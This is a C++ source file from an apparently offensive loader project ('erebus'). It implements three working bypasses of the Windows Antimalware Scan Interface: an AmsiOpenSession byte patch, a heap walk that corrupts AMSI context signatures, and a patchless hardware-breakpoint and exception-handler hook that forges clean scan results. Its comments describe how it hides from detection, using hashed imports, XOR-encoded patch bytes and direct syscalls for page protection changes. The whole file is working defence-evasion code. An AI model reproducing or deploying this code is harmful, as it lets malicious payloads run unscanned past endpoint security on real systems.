/**
 * @file amsi_bypass.cpp
 * @brief Expanded AMSI bypass variants (Type 2 and Type 3).
 *
 * Compile-time selected via CONFIG_AMSI_BYPASS_TYPE:
 *   2 = PatchAmsiOpenSession  - zero the session-creation gate so no scan
 *       context can be initialised; complements the existing PatchAmsi().
 *   3 = InvalidateAmsiContext - walk all process heaps and corrupt the
 *       'AMSI' signature field in every live AMSI_CONTEXT block found,
 *       causing AmsiScanBuffer to return E_INVALIDARG on any context that
 *       was already open at patch time.
 *
 * OPSEC notes:
 *   - Module and export names never appear as plaintext in .rdata; all
 *     resolution goes through ImportModule() / ImportFunction() (hashed).
 *   - Page protection flips use FlipProtection() (NtProtectVirtualMemory)
 *     rather than VirtualProtect to stay off the common hook surface.
 *   - Patch byte arrays are XOR-encoded with CONFIG_PATCH_XOR_KEY and
 *     decoded into a stack-resident buffer at runtime so the live opcodes
 *     never appear statically in the binary.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion_utils.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/amsi_bypass.hpp"
#include "../../include/evasion/syscall_backend.hpp"
#include "../../include/config.hpp"

namespace erebus {
namespace evasion {

    // ------------------------------------------------------------------
    // Internal: decode a XOR-obfuscated patch array into a stack buffer.
    // key is CONFIG_PATCH_XOR_KEY. Operates on SIZE_T bytes.
    // ------------------------------------------------------------------
    static inline void DecodePatch(const BYTE* encoded, BYTE* out, SIZE_T len)
    {
        for (SIZE_T i = 0; i < len; i++)
            out[i] = encoded[i] ^ (BYTE)CONFIG_PATCH_XOR_KEY;
    }

    // ------------------------------------------------------------------
    // Type 2: PatchAmsiOpenSession
    //
    // AmsiOpenSession initialises a scan context and stamps the 'AMSI'
    // signature at offset 0.  Patching it to `xor eax, eax; ret` (3 bytes,
    // x64) makes it return S_OK == 0 with a zeroed output pointer, so any
    // subsequent AmsiScanBuffer call on that NULL context returns
    // E_INVALIDARG without performing a scan.
    // ------------------------------------------------------------------

    BOOL PatchAmsiOpenSession()
    {
        HMODULE hAmsi = ImportModule("amsi.dll");
        if (!hAmsi)
        {
            hAmsi = erebus::LoadLibraryC(L"amsi.dll");
            if (!hAmsi)
            {
                LOG_INFO("amsi.dll not loaded, skipping PatchAmsiOpenSession");
                return TRUE;
            }
        }

        typedef HRESULT (WINAPI *typeAmsiOpenSession)(HANDLE, HANDLE*);
        ImportFunction(hAmsi, AmsiOpenSession, typeAmsiOpenSession);
        if (!AmsiOpenSession)
        {
            LOG_ERROR("Failed to resolve AmsiOpenSession");
            return FALSE;
        }

        // XOR-encoded `xor eax, eax; ret` (3 bytes, x64).
        // Plaintext:  0x33 0xC0 0xC3
        // Encoded:    each byte XOR CONFIG_PATCH_XOR_KEY
        static const BYTE kEncoded[] = {
            (BYTE)(0x33 ^ CONFIG_PATCH_XOR_KEY),
            (BYTE)(0xC0 ^ CONFIG_PATCH_XOR_KEY),
            (BYTE)(0xC3 ^ CONFIG_PATCH_XOR_KEY)
        };

        BYTE patch[3];
        DecodePatch(kEncoded, patch, sizeof(patch));

        ULONG oldProtect = 0;
        if (!FlipProtection((LPVOID)AmsiOpenSession, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("NtProtectVirtualMemory failed on AmsiOpenSession");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)AmsiOpenSession, patch, sizeof(patch));

        ULONG dummy = 0;
        FlipProtection((LPVOID)AmsiOpenSession, sizeof(patch), oldProtect, &dummy);

        LOG_SUCCESS("AMSI patched (AmsiOpenSession -> xor eax,eax; ret)");
        return TRUE;
    }

    // ------------------------------------------------------------------
    // Type 3: InvalidateAmsiContext
    //
    // The AMSI_CONTEXT layout (undocumented but stable since Win10 RS1):
    //
    //   offset 0x00  DWORD  Signature   == 'AMSI' (0x49534D41)
    //   offset 0x04  ...    (remaining fields irrelevant here)
    //
    // AmsiScanBuffer checks Signature before scanning:
    //
    //   if (ctx->Signature != 0x49534D41) return E_INVALIDARG;
    //
    // We walk every heap in the process looking for 16-byte-aligned blocks
    // whose first DWORD equals 0x49534D41 and overwrite that DWORD with 0.
    // GetProcessHeaps() / HeapWalk() are resolved by hash to avoid plaintext.
    // ------------------------------------------------------------------

    BOOL InvalidateAmsiContext()
    {
        // Resolve HeapWalk and GetProcessHeaps through the standard hashed
        // import path so their names do not appear in .rdata.
        HMODULE hKernel32 = ImportModule("kernel32.dll");
        if (!hKernel32)
        {
            LOG_ERROR("Failed to get kernel32.dll for InvalidateAmsiContext");
            return FALSE;
        }

        typedef DWORD  (WINAPI *typeGetProcessHeaps)(DWORD, PHANDLE);
        typedef BOOL   (WINAPI *typeHeapWalk)(HANDLE, LPPROCESS_HEAP_ENTRY);

        ImportFunction(hKernel32, GetProcessHeaps, typeGetProcessHeaps);
        ImportFunction(hKernel32, HeapWalk,        typeHeapWalk);

        if (!GetProcessHeaps || !HeapWalk)
        {
            LOG_ERROR("Failed to resolve GetProcessHeaps / HeapWalk");
            return FALSE;
        }

        // Collect all heap handles.  The process almost always has one heap
        // (the default CRT heap); a second call with the exact count avoids
        // a dynamic allocation.
        DWORD  heapCount = GetProcessHeaps(0, NULL);
        if (heapCount == 0) return TRUE;    // no heaps - nothing to do

        HANDLE heaps[64] = {};              // 64 heaps is more than enough
        if (heapCount > 64) heapCount = 64;
        GetProcessHeaps(heapCount, heaps);

        // AMSI signature constant, built from individual characters so the
        // four-byte literal 'AMSI' never appears contiguously in .rdata.
        const DWORD kAmsiSig = ((DWORD)'A')
                             | ((DWORD)'M' << 8)
                             | ((DWORD)'S' << 16)
                             | ((DWORD)'I' << 24);  // 0x49534D41 LE

        DWORD patched = 0;

        for (DWORD h = 0; h < heapCount; h++)
        {
            if (!heaps[h]) continue;

            PROCESS_HEAP_ENTRY entry = {};
            while (HeapWalk(heaps[h], &entry))
            {
                // Only examine committed, busy (allocated) blocks.
                if (!(entry.wFlags & PROCESS_HEAP_ENTRY_BUSY))
                    continue;

                // Minimum viable AMSI_CONTEXT is at least 8 bytes.
                if (entry.cbData < 8)
                    continue;

                PBYTE  block = (PBYTE)entry.lpData;
                PDWORD sig   = (PDWORD)block;

                if (*sig == kAmsiSig)
                {
                    // Zero the signature field.  The block is on the heap
                    // and is already writable - no protection flip needed.
                    *sig = 0;
                    patched++;
                }
            }
        }

        if (patched > 0)
            LOG_SUCCESS("AMSI context(s) invalidated (Signature zeroed)");
        else
            LOG_INFO("InvalidateAmsiContext: no live AMSI contexts found");

        return TRUE;
    }

    // ------------------------------------------------------------------
    // Type 4: PatchlessAmsi  (hardware-breakpoint + VEH)
    //
    // Bypass AmsiScanBuffer without modifying any code bytes. We arm a
    // Dr0 execute breakpoint at the function's first instruction and
    // install a vectored exception handler that, on the resulting #DB,
    // forges a return: AMSI_RESULT_CLEAN is written to the caller's
    // result-out pointer (6th arg, [RSP+0x30] on entry), RAX is set to
    // S_OK (0), and RIP/RSP are adjusted to perform an in-place `ret`.
    // The original AmsiScanBuffer prologue is never executed.
    //
    // Defeats: PG/CFG integrity scans, byte-pattern detections looking
    // for `0x33 0xC0 0xC3` / `B8 57 00 07 80 C3` patches.
    // Coverage:  current thread only (Dr0 is per-thread). Acceptable for
    //            loaders that drive the AMSI-relevant call themselves.
    //
    // OPSEC: zero writes to amsi.dll memory; the only artefact is the
    // VEH chain entry and Dr0/Dr7 in our own thread's CONTEXT.
    // ------------------------------------------------------------------

    static PVOID  g_AmsiVehHandle      = nullptr;
    static LPVOID g_AmsiScanBufferAddr = nullptr;

    static LONG CALLBACK AmsiVehHandler(EXCEPTION_POINTERS* info)
    {
        if (!info || !info->ExceptionRecord || !info->ContextRecord)
            return EXCEPTION_CONTINUE_SEARCH;

        // Only handle the single-step / HW-breakpoint exception we armed
        // at AmsiScanBuffer's first instruction. Anything else passes
        // through so we don't smother unrelated #DBs.
        if (info->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
            return EXCEPTION_CONTINUE_SEARCH;

        PCONTEXT ctx = info->ContextRecord;
        if ((LPVOID)ctx->Rip != g_AmsiScanBufferAddr)
            return EXCEPTION_CONTINUE_SEARCH;

        // x64 calling convention on entry (no prologue executed yet):
        //   [RSP+0x00] return address
        //   [RSP+0x08..0x20] shadow space (RCX/RDX/R8/R9 spill slots)
        //   [RSP+0x28] amsiSession      (5th arg)
        //   [RSP+0x30] AMSI_RESULT*     (6th arg, out parameter)
        DWORD* amsiResult = *(DWORD**)(ctx->Rsp + 0x30);
        if (amsiResult)
            *amsiResult = 0;            // AMSI_RESULT_CLEAN

        // Forge a `ret` - RAX = S_OK, RIP = saved return address, pop it.
        ctx->Rax  = 0;
        ctx->Rip  = *(DWORD64*)ctx->Rsp;
        ctx->Rsp += sizeof(DWORD64);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    BOOL PatchlessAmsi()
    {
        HMODULE hAmsi = ImportModule("amsi.dll");
        if (!hAmsi)
        {
            hAmsi = erebus::LoadLibraryC(L"amsi.dll");
            if (!hAmsi)
            {
                LOG_INFO("amsi.dll not loaded, skipping PatchlessAmsi");
                return TRUE;
            }
        }

        typedef HRESULT (WINAPI *typeAmsiScanBuffer)(HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, INT*);
        ImportFunction(hAmsi, AmsiScanBuffer, typeAmsiScanBuffer);
        if (!AmsiScanBuffer)
        {
            LOG_ERROR("Failed to resolve AmsiScanBuffer for patchless bypass");
            return FALSE;
        }
        g_AmsiScanBufferAddr = (LPVOID)AmsiScanBuffer;

        // Install handler at the front of the VEH chain so we see the
        // #DB before any debugger/CRT handler swallows it.
        g_AmsiVehHandle = AddVectoredExceptionHandler(1, AmsiVehHandler);
        if (!g_AmsiVehHandle)
        {
            LOG_ERROR("AddVectoredExceptionHandler failed (patchless AMSI)");
            return FALSE;
        }

        // Arm Dr0 on the current thread - execute breakpoint, 1 byte.
        // Dr7 layout: bit0 = L0 (local enable Dr0), bits 16-17 = R/W0
        // (00 = execute), bits 18-19 = LEN0 (00 = 1 byte). All other Dr0
        // condition bits cleared so the existing Dr1/2/3 setup (if any)
        // is preserved.
        CONTEXT thrCtx = {};
        thrCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        HANDLE hSelf = GetCurrentThread();
        if (!GetThreadContext(hSelf, &thrCtx))
        {
            LOG_ERROR("GetThreadContext failed (patchless AMSI)");
            RemoveVectoredExceptionHandler(g_AmsiVehHandle);
            g_AmsiVehHandle = nullptr;
            return FALSE;
        }
        thrCtx.Dr0 = (DWORD64)g_AmsiScanBufferAddr;
        // Clear Dr0's L0/G0/cond/LEN bits then set L0 = 1.
        thrCtx.Dr7 = (thrCtx.Dr7 & ~((DWORD64)0x000F000F)) | (DWORD64)0x00000001;
        thrCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (!SetThreadContext(hSelf, &thrCtx))
        {
            LOG_ERROR("SetThreadContext failed (patchless AMSI)");
            RemoveVectoredExceptionHandler(g_AmsiVehHandle);
            g_AmsiVehHandle = nullptr;
            return FALSE;
        }

        LOG_SUCCESS("AMSI patchless bypass armed (Dr0 + VEH @ AmsiScanBuffer)");
        return TRUE;
    }

} // namespace evasion
} // namespace erebus
